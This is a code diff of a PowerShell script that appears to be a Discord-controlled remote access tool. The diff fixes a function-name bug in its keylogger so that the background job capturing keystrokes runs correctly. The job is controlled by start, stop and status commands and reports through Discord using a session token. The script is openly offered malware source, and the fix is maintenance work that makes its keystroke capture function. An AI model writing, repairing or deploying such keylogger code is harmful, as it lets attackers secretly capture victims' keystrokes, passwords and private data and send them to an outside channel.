@@ -140,6 +140,7 @@ function Mkeylogger {
         sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
     }
 }
+
 #ENABLEKEYLOG
 function MStart_Keylogger {
     param([int]$intervalSeconds = 30)
@@ -171,9 +172,9 @@ function MStart_Keylogger {
             ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
             ${function:sendFile} = ${using:function:sendFile}
             ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
-            ${function:keylogger} = ${using:function:keylogger}
+            ${function:Mkeylogger} = ${using:function:Mkeylogger}  # FIX: Changed from keylogger to Mkeylogger
             
-            keylogger -intervalSeconds $intervalSeconds
+            Mkeylogger -intervalSeconds $intervalSeconds  # FIX: Changed from keylogger to Mkeylogger
             
         } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds
         
@@ -185,6 +186,7 @@ function MStart_Keylogger {
         sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
     }
 }
+
 #DISABLEKEYLOG
 function MStop_Keylogger {
     $global:keyloggerstatus = $false
@@ -220,6 +222,7 @@ function MStop_Keylogger {
         sendMsg -Message ":information_source: **Keylogger is not running**"
     }
 }
+
 #GETKEYLOGSTATUS
 function MGet_KeyloggerStatus {
     if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
